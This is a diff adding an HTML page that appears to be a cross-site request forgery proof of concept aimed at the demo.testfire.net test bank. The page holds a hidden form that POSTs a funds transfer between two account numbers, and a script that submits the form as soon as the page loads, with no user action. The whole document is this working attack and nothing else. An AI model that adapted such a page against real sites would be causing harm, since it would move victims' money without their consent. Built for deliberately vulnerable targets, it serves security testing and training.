@@ -1,0 +1,14 @@
+<html>
+<body>
+<form ENCTYPE="application/x-www-form-urlencoded" name="foo" method="POST" action="http://demo.testfire.net/bank/doTransfer">
+
+<input type="hidden" name="fromAccount" value="800000">
+<input type="hidden" name="toAccount" value="800001">
+<input type="hidden" name="transferAmount" value="5">
+<input type="hidden" name="transfer" value="Transfer+Money">
+</form>
+<script>
+document.foo.submit();
+</script>
+</body>
+</html>
